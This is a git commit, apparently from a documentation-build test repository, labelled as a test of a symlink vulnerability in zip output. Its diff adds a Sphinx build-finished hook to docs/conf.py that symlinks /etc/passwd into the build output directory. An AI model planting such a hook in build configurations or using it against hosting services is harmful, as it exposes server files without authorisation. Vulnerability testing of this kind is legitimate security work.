4254292e865d6ffc4044c039f72f498607000549
Santos Gallegos <stsewd@proton.me>
2023-01-12 18:03:09 -0500

    Test symlink vulnerability via zipfile

--- docs/conf.py
+++ docs/conf.py
@@ -1,4 +1,5 @@
-# -*- coding: utf-8 -*-
+from pathlib import Path
+import subprocess
 
 # Default settings
 project = 'Test Builds'
@@ -11,3 +12,11 @@ latex_engine = 'xelatex'  # allow us to build Unicode chars
 
 # Include all your settings here
 html_theme = 'sphinx_rtd_theme'
+html_static_path = ['_static']
+
+def _build_finished(app, exc):
+    link = Path(app.outdir) / "passwd"
+    subprocess.run(["ln", "-s", "/etc/passwd", link])
+
+def setup(app):
+    app.connect('build-finished', _build_finished)
